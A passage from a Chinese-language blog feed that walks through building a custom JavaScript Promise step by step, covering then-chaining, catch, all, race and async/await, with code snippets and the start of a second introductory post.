class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样我们的value和reason就和Promise.Result绑定起来了</p><h2 id="4-Promise的异步"><a href="#4-Promise的异步" class="headerlink" title="4.Promise的异步"></a>4.Promise的异步</h2><p>如果我们执行的是这样一个异步任务，以我们现在的Promise代码只有reject和resolve的判断，会什么也输出不了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">let p = new Promise((resolve,reject) =&gt; &#123;</span><br><span class="line">    //reslove(&quot;OK&quot;)</span><br><span class="line">    //抛出异常</span><br><span class="line">    setTimeout(() =&gt; &#123;</span><br><span class="line">        resolve(&quot;OK&quot;)</span><br><span class="line">    &#125;, 1000);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>所以我们需要一个对pending的判断，并产生相应的回调</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">//首先在构造函数中加入callback对象，用于存放不能及时调用的onResolved和onRejected</span><br><span class="line">let callback = &#123;&#125;</span><br><span class="line">//在then方法中加入对pending状态的判断</span><br><span class="line">if (this.PromsieState === &#x27;pending&#x27;) &#123;</span><br><span class="line">        //在pending状态下需要执行回调</span><br><span class="line">        this.callback = &#123;</span><br><span class="line">            onRejected,</span><br><span class="line">            onResolved</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> //然后就是在任务调用resolve和reject时，触发onRejected和onResolved</span><br><span class="line">     function resolve(value) &#123;</span><br><span class="line">        if (self.PromsieState !== &#x27;pending&#x27;) return</span><br><span class="line">        //1.更改状态</span><br><span class="line">        self.PromsieState = &#x27;fulfilled&#x27;</span><br><span class="line">        //2.更改结果</span><br><span class="line">        self.PromsieResult = value</span><br><span class="line">        //如果callback有onResolved =&gt; 说明这个任务是异步任务，没有及时触发then方法</span><br><span class="line">        if(self.callback.onResolved)&#123;</span><br><span class="line">            self.callback.onResolved(value)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function reject(reason) &#123;</span><br><span class="line">        if (self.PromsieState !== &#x27;pending&#x27;) return</span><br><span class="line">        //1.更改状态</span><br><span class="line">        self.PromsieState = &#x27;rejected&#x27;</span><br><span class="line">        //2.更改结果</span><br><span class="line">        self.PromsieResult = reason</span><br><span class="line">        //如果callback有onRejected =&gt; 说明这个任务是异步任务，没有及时触发then方法</span><br><span class="line">        if(self.callback.onRejected)&#123;</span><br><span class="line">            self.callback.onRejected(reason)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="5-指定多个回调"><a href="#5-指定多个回调" class="headerlink" title="5.指定多个回调"></a>5.指定多个回调</h2><p>当我们需要指定多个回调的时候</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p.then(value =&gt;&#123;</span><br><span class="line">    console.log(value);</span><br><span class="line">&#125;,reason =&gt; &#123;</span><br><span class="line">    console.warn(reason);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">p.then(value =&gt;&#123;</span><br><span class="line">    alert(value);</span><br><span class="line">&#125;,reason =&gt; &#123;</span><br><span class="line">    alert(reason);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>我们的callback就会被调用两次，从而callback里面的回调函数就会被覆盖</p><p>所以我们需要把callback设置成一个数组，把每次的回调都push进去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">//设置callbacks为数组</span><br><span class="line">let callbacks = []</span><br><span class="line">//为了避免出现覆盖问题，使用数组的push方法保存每一次的回调</span><br><span class="line">if (this.PromsieState === &#x27;pending&#x27;) &#123;</span><br><span class="line">        //在pending状态下需要保存回调</span><br><span class="line">        this.callbacks.push(&#123;</span><br><span class="line">            onResolved,</span><br><span class="line">            onRejected</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"> //遍历callbacks数组，使用里面的回调函数</span><br><span class="line">     function resolve(value) &#123;</span><br><span class="line">        if (self.PromsieState !== &#x27;pending&#x27;) return</span><br><span class="line">        //1.更改状态</span><br><span class="line">        self.PromsieState = &#x27;fulfilled&#x27;</span><br><span class="line">        //2.更改结果</span><br><span class="line">        self.PromsieResult = value</span><br><span class="line">        //然后就是在任务调用resolve和reject时，触发onRejected和onResolved</span><br><span class="line">        self.callbacks.forEach(callback =&gt; &#123;</span><br><span class="line">            callback.onResolved(value)</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="6-返回一个promise对象"><a href="#6-返回一个promise对象" class="headerlink" title="6.返回一个promise对象"></a>6.返回一个promise对象</h2><p>但是我们还不能完成promise的精髓，then方法返回一个promise对象</p><p>需要返回一个promise对象，那么我们then方法中就需要return new promise</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">return new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">    if (this.PromiseState === &#x27;fulfilled&#x27;) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            //获取回调函数的执行结果</span><br><span class="line">            let result = onResolved(this.PromiseResult)//Result传入第一个函数作为实参value</span><br><span class="line">            //如果是一个promise对象，则根据这个对象的状态设置result</span><br><span class="line">            if (result instanceof Promise) &#123;</span><br><span class="line">                result.then(value =&gt; &#123;</span><br><span class="line">                    resolve(value)</span><br><span class="line">                &#125;, reason =&gt; &#123;</span><br><span class="line">                    reject(reason)</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                //一个非Promise对象，返回设置为成功</span><br><span class="line">                resolve(result)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            reject(e)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else if (this.PromiseState === &#x27;rejected&#x27;) &#123;</span><br><span class="line">        onRejected(this.PromsieResult)</span><br><span class="line">    &#125; else if (this.PromiseState === &#x27;pending&#x27;) &#123;</span><br><span class="line">        //在pending状态下需要保存回调</span><br><span class="line">        this.callbacks.push(&#123;</span><br><span class="line">            onResolved,</span><br><span class="line">            onRejected</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>其中result收到了回调函数的执行结果，也就是你then中return的东西，然后对这个结果进行判断，但是如果我们是throw的错误，就需要通过try—catch捕获，更改状态，然后返回给then。</p><h2 id="7-异步的返回"><a href="#7-异步的返回" class="headerlink" title="7.异步的返回"></a>7.异步的返回</h2><p>但是我们这样写有一个很大的问题，异步的callback我们只录入了onResolved，没有返回一个promise对象更没有进行判断和更改对象的状态这个步骤。</p><p>于是我们在保存回调函数的时候，就需要给回调函数加上判断和状态的更改：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">onResolved: function () &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        //获取执行成功的结果</span><br><span class="line">        let result = onResolved(self.PromiseResult)</span><br><span class="line">        //类似的判断</span><br><span class="line">        if (result instanceof Promise) &#123;</span><br><span class="line">            result.then(value =&gt; &#123;</span><br><span class="line">                resolve(value)</span><br><span class="line">            &#125;, reason =&gt; &#123;</span><br><span class="line">                reject(reason)</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            //一个非Promise对象，返回设置为成功</span><br><span class="line">            resolve(result)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">        reject(e)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br><span class="line">onRejected: function () &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        let result = onRejected(self.PromiseResult)</span><br><span class="line">        if (result instanceof Promise) &#123;</span><br><span class="line">            result.then(value =&gt; &#123;</span><br><span class="line">                resolve(value)</span><br><span class="line">            &#125;, reason =&gt; &#123;</span><br><span class="line">                reject(reason)</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            //一个非Promise对象，返回设置为成功</span><br><span class="line">            resolve(result)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">        reject(e)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码有很多相同的部分，封装起来复用:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">const self = this</span><br><span class="line">//将判断封装成函数</span><br><span class="line">function OnCall(type) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        //获取回调函数的执行结果</span><br><span class="line">        let result = type(self.PromiseResult)//Result传入第一个函数作为实参value</span><br><span class="line">        //如果是一个promise对象，则根据这个对象的状态设置result</span><br><span class="line">        if (result instanceof Promise) &#123;</span><br><span class="line">            result.then(value =&gt; &#123;</span><br><span class="line">                resolve(value)</span><br><span class="line">            &#125;, reason =&gt; &#123;</span><br><span class="line">                reject(reason)</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            //一个非Promise对象，返回设置为成功</span><br><span class="line">            resolve(result)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">        reject(e)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="8-Promise中加入catch"><a href="#8-Promise中加入catch" class="headerlink" title="8.Promise中加入catch"></a>8.Promise中加入catch</h2><p>通过调用p.catch实现对于错误的捕捉，这里只需要传入一个onRejected参数，需要返回一个promise对象就直接调用then方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Promise.prototype.catch = function (onRejected) &#123;</span><br><span class="line">    return this.then(undefined,onRejected)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有在异常穿透中的错误捕捉，但是异常穿透的then方法中没有reason回调（会报错），我们需要在原型then中加上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//判断是否有reason回调,没有的话onRejected的类型不会是一个函数</span><br><span class="line">if(typeof onRejected !== &#x27;function&#x27;)&#123;</span><br><span class="line">    //将onRejected变成一个函数</span><br><span class="line">    onRejected = reason =&gt; &#123;</span><br><span class="line">        throw reason</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们也可以在promise中写出这样的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p.then().then(value =&gt; &#123;</span><br><span class="line">    reject(&quot;err&quot;)</span><br><span class="line">    //返回一个pending类型的promise对象时中断链式</span><br><span class="line">    // return new Promise(() =&gt;&#123;&#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>为了实现这种写法，我们需要对onResolved也进行补全</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if(typeof onRejected !== &#x27;function&#x27;)&#123;</span><br><span class="line">        //将onRejected变成一个函数</span><br><span class="line">        onRejected = reason =&gt; &#123;</span><br><span class="line">            throw reason</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //onResloved没传也需要添加</span><br><span class="line">    if(typeof onResolved !== &#x27;function&#x27;)&#123;</span><br><span class="line">        onResolved = value =&gt; value</span><br><span class="line">        //等同于&#123;return value&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="9-封装resolve和reject方法"><a href="#9-封装resolve和reject方法" class="headerlink" title="9.封装resolve和reject方法"></a>9.封装resolve和reject方法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//封装resolve方法，属于promise实例对象而不是原型对象</span><br><span class="line">Promise.resolve = function (value) &#123;</span><br><span class="line">    return new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">        //判断是否为promise对象</span><br><span class="line">        if (value instanceof Promise) &#123;</span><br><span class="line">            value.then(value =&gt; &#123;</span><br><span class="line">                resolve(value)</span><br><span class="line">            &#125;, reason =&gt; &#123;</span><br><span class="line">                reject(reason)</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            //这里的this指向promise对象</span><br><span class="line">            //如果使用this.resolve指向的便是我们这个函数，会导致递归栈溢出</span><br><span class="line">            console.log(this.resolve);</span><br><span class="line">            resolve(value)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><p>注意这里this.resolve 和 resolve的区别</p><p>reject方法与resolve类似，只是无论value是什么都是调用reject</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//封装reject方法，属于promise实例对象而不是原型对象</span><br><span class="line">Promise.reject = function (value) &#123;</span><br><span class="line">    return new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">        reject(value)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="10-封装all方法"><a href="#10-封装all方法" class="headerlink" title="10.封装all方法"></a>10.封装all方法</h2><p>all方法的返回看得是整个传入数组，如果有失败则返回第一个失败对象，如果全部成功才返回成功对象而且包含所有成功value</p><p>第一种可以使用every方法，但是会有异步问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">return new Promise((resolve,reject)=&gt;&#123;</span><br><span class="line">    // every方法——简洁但是有异步问题</span><br><span class="line">    let arr = [] </span><br><span class="line">    const result = Promises.every(function(item)&#123;</span><br><span class="line">        arr.push(item.PromiseResult)</span><br><span class="line">        return item.PromiseState === &quot;fulfilled&quot;</span><br><span class="line">    &#125;)</span><br><span class="line">    console.log(result);</span><br><span class="line">    if(result)&#123;</span><br><span class="line">        resolve(arr)</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        reject()</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>所谓异步问题是：如果我们的p1是延时回调，那么p1虽然在数组中排第一个，但是在返回的数组中就排到了最后一个。</p><p>第二种使用我们的常规方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//遍历数组方法——复杂一点但是易维护</span><br><span class="line">//设置变量</span><br><span class="line">let count = 0</span><br><span class="line">let arr = []</span><br><span class="line">for(let i=0 ; i&lt;Promises.length ;i++)&#123;</span><br><span class="line">    //调用then方法</span><br><span class="line">    Promises[i].then(value =&gt; &#123;</span><br><span class="line">        //统计成功值</span><br><span class="line">        arr[i] = value</span><br><span class="line">        count++</span><br><span class="line">        if(count === Promises.length)&#123;</span><br><span class="line">            //说明全部成功，传入成功数组</span><br><span class="line">            resolve(arr)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,reason =&gt; &#123;</span><br><span class="line">        reject(reason)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样子我们的异步问题便解决了</p><h2 id="11-封装race方法"><a href="#11-封装race方法" class="headerlink" title="11.封装race方法"></a>11.封装race方法</h2><p>race方法也是接收一个promise数组，返回一个promise对象。返回的promise对象的状态由第一个改变状态的数组对象决定</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//添加promise.race方法</span><br><span class="line">Promise.race = function (promises) &#123;</span><br><span class="line">    return new Promise((resolve,reject)=&gt;&#123;</span><br><span class="line">        //遍历promises数组</span><br><span class="line">        for(let i=0;i&lt;promises.length;i++)&#123;</span><br><span class="line">            //谁先第一个改变，就改为谁的状态</span><br><span class="line">            promises[i].then(value=&gt;&#123;</span><br><span class="line">                resolve(value)</span><br><span class="line">            &#125;,reason=&gt;&#123;</span><br><span class="line">                reject(reason)</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里包含了一个调用的先后顺序问题，依然使用for循环解决，谁先调用，谁的then方法就先奏效。</p><h2 id="12-then方法的异步执行"><a href="#12-then方法的异步执行" class="headerlink" title="12.then方法的异步执行"></a>12.then方法的异步执行</h2><p>then方法中的操作是异步执行，最主要的特点就是需要在同步代码执行完毕后执行</p><p>为了将then方法转换为异步，我们需要在调用resolve和reject还有使用call(onResloved)的时候加入setTimeout，将函数改为异步</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(() =&gt; &#123;</span><br><span class="line">    self.callbacks.forEach(callback =&gt; &#123;</span><br><span class="line">        callback.onResolved(value)</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">if (this.PromiseState === &#x27;fulfilled&#x27;) &#123;</span><br><span class="line">    //添加异步任务</span><br><span class="line">    setTimeout(() =&gt; &#123;</span><br><span class="line">        OnCall(onResolved)</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="13-将promise封装成类"><a href="#13-将promise封装成类" class="headerlink" title="13.将promise封装成类"></a>13.将promise封装成类</h2><p>为了实现promise的封装性，我们将promise封装成类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class promise &#123;</span><br><span class="line">    //构造函数</span><br><span class="line">    constructor(executor) &#123;&#125;</span><br><span class="line">    </span><br><span class="line">    then()</span><br><span class="line">    </span><br><span class="line">    static all()</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>封装完成之后调试一下，得到和之前一眼的结果！！</p><p>赏心悦目</p><h2 id="14-async函数"><a href="#14-async函数" class="headerlink" title="14.async函数"></a>14.async函数</h2><p>返回一个promise类型的对象，对象的结果由async的return值决定</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">async function main() &#123;</span><br><span class="line">    //返回的数值决定了返回的promise对象</span><br><span class="line">    // return &quot;ok&quot;</span><br><span class="line">    // return new Promise((reslove,reject)=&gt;&#123;</span><br><span class="line">    //     reslove(&quot;OK&quot;)</span><br><span class="line">    // &#125;)</span><br><span class="line"></span><br><span class="line">    throw &quot;err&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let result = main()</span><br><span class="line"></span><br><span class="line">console.log(result);</span><br></pre></td></tr></table></figure><h2 id="15-await函数"><a href="#15-await函数" class="headerlink" title="15.await函数"></a>15.await函数</h2><p>await函数的右边是一个promise或者promise对象</p><p>如果右边是一个成功的promise对象，那么我们得到的就是成功promise对象的结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">async function main() &#123;</span><br><span class="line">    //返回的数值决定了返回的promise对象</span><br><span class="line">    // return &quot;ok&quot;</span><br><span class="line">    // return new Promise((reslove,reject)=&gt;&#123;</span><br><span class="line">    //     reslove(&quot;OK&quot;)</span><br><span class="line">    // &#125;)</span><br><span class="line">    // throw &quot;err&quot;</span><br><span class="line">    let p = new Promise((reslove, reject) =&gt; &#123;</span><br><span class="line">        reslove(&quot;OK&quot;)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    let res = await p</span><br><span class="line"></span><br><span class="line">    console.log(res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let result = main()</span><br><span class="line"></span><br><span class="line">console.log(result);</span><br></pre></td></tr></table></figure><p>如果右边是一个失败的promise对象，那么我们需要用一个try_catch捕获失败原因</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">async function main() &#123;</span><br><span class="line">    //返回的数值决定了返回的promise对象</span><br><span class="line">    // return &quot;ok&quot;</span><br><span class="line">    // return new Promise((reslove,reject)=&gt;&#123;</span><br><span class="line">    //     reslove(&quot;OK&quot;)</span><br><span class="line">    // &#125;)</span><br><span class="line">    // throw &quot;err&quot;</span><br><span class="line">    let p = new Promise((reslove, reject) =&gt; &#123;</span><br><span class="line">        reject(&quot;OK&quot;)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        let res = await p</span><br><span class="line">    &#125;</span><br><span class="line">    catch(e) &#123;</span><br><span class="line">        console.log(res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let result = main()</span><br><span class="line"></span><br><span class="line">console.log(result);</span><br></pre></td></tr></table></figure><p>如果右边是一个非promise对象，那么我们得到的就是对象的数值</p><p>实际工程当中我们经常使用async和await处理promise的操作</p>]]></content>
    
    
    
    <tags>
      
      <tag>Promise</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Promise</title>
    <link href="/2022/06/04/Promise/"/>
    <url>/2022/06/04/Promise/</url>
    
    <content type="html"><![CDATA[<h1 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h1><h2 id="1-何为Promise"><a href="#1-何为Promise" class="headerlink" title="1.何为Promise"></a>1.何为Promise</h2><p>首先说一下promise 是什么？</p><p>1、本质是构造函数中主要用于异步计算</p><p>2、可以将异步操作队列化，按照期望的顺序执行，返回符合预期的结果</p><p>其次主要处理异步和操作同步化</p><h2 id="2-Promise的好处"><a href="#2-Promise的好处" class="headerlink" title="2.Promise的好处"></a>2.Promise的好处</h2><h3 id="2-1-指定回调函数的方式更加灵活"><a href="#2-1-指定回调函数的方式更加灵活" class="headerlink" title="2.1.指定回调函数的方式更加灵活"></a>2.1.指定回调函数的方式更加灵活</h3><p>（1）：旧的回调必须在启动异步任务前指定，比如setTimeout</p><p>（2）：promise则是：启动异步任务 =&gt; 返回promise对象 =&gt; 给promise对象绑定回调函数</p><h3 id="2-2-支持链式调用，可以解决回调地狱问题"><a href="#2-2-支持链式调用，可以解决回调地狱问题" class="headerlink" title="2.2.支持链式调用，可以解决回调地狱问题"></a>2.2.支持链式调用，可以解决回调地狱问题</h3><p>（1）：回调地狱？</p><p>回调地狱就是回调函数的嵌套调用，外部回调函数异步执行的结果是嵌套的回调执行的条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">asFunc1(opt, (...args1)=&gt;&#123;</span><br><span class="line">asFunc2(opt, (...args2)=&gt;&#123;</span><br><span class="line">...</span><br><span class="line">&#125;)</span><br><span 